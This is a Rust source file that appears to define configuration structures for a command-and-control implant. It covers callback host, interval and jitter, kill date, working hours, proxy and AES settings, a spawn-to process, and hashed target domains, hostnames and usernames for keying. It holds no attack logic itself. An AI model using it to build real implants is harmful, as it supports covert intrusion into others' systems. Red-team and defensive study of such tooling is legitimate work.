use std::collections::HashMap;

use serde::{Deserialize, Serialize};
use serde_repr::{Deserialize_repr, Serialize_repr};
use utils::uuid::Uuid;

/// Configuration option for the initial payload execution
#[derive(Serialize_repr, Deserialize_repr, Copy, Clone, Debug)]
#[repr(u8)]
pub enum InitOption {
    /// Payload should not do anything special when executed
    None = 0,

    /// Payload should run in a new thread
    Thread = 1,

    /// Payload should fork to the background
    Fork = 2,
}

/// HTTP C2 profile proxy information
#[derive(Serialize, Deserialize, Debug)]
pub struct ProxyInfo<'a> {
    host: &'a str,
    port: u16,
    user: &'a str,
    pass: &'a str,
}

/// HTTP Profile crypto info
#[derive(Serialize, Deserialize, Debug)]
pub enum CryptoInfo {
    /// AES256 encryption type
    #[serde(rename = "aes256_hmac")]
    Aes256Hmac {
        /// AES key
        key: [u8; 16],
    },
}

/// HTTP profile configuration variables
#[derive(Serialize, Deserialize, Debug, Default)]
pub struct HttpConfigVars<'a> {
    callback_host: &'a str,
    callback_interval: u32,
    callback_jitter: u16,
    callback_port: u16,
    killdate: u64,
    encrypted_exchange_check: bool,
    crypto_info: Option<CryptoInfo>,
    headers: HashMap<&'a str, &'a str>,
    get_uri: &'a str,
    post_uri: &'a str,
    query_path_name: &'a str,
    proxy_info: Option<ProxyInfo<'a>>,
}

/// Payload configuration variables
#[derive(Serialize, Deserialize, Debug)]
pub struct ConfigVars<'a> {
    uuid: Uuid,
    init_option: InitOption,
    working_hours_start: u64,
    working_hours_end: u64,
    connection_retries: u32,
    domains: Vec<[u8; 32]>,
    hostnames: Vec<[u8; 32]>,
    usernames: Vec<[u8; 32]>,
    tlsuntrusted: bool,
    spawn_to: &'a str,
    http_profile: Option<HttpConfigVars<'a>>,
}

impl ConfigVars<'_> {
    /// Returns the payload uuid
    pub fn uuid(&self) -> &Uuid {
        &self.uuid
    }

    /// Returns the payload init options
    pub fn init_option(&self) -> InitOption {
        self.init_option
    }

    pub fn domains(&self) -> &Vec<[u8; 32]> {
        &self.domains
    }

    pub fn hostnames(&self) -> &Vec<[u8; 32]> {
        &self.hostnames
    }

    pub fn usernames(&self) -> &Vec<[u8; 32]> {
        &self.usernames
    }
}
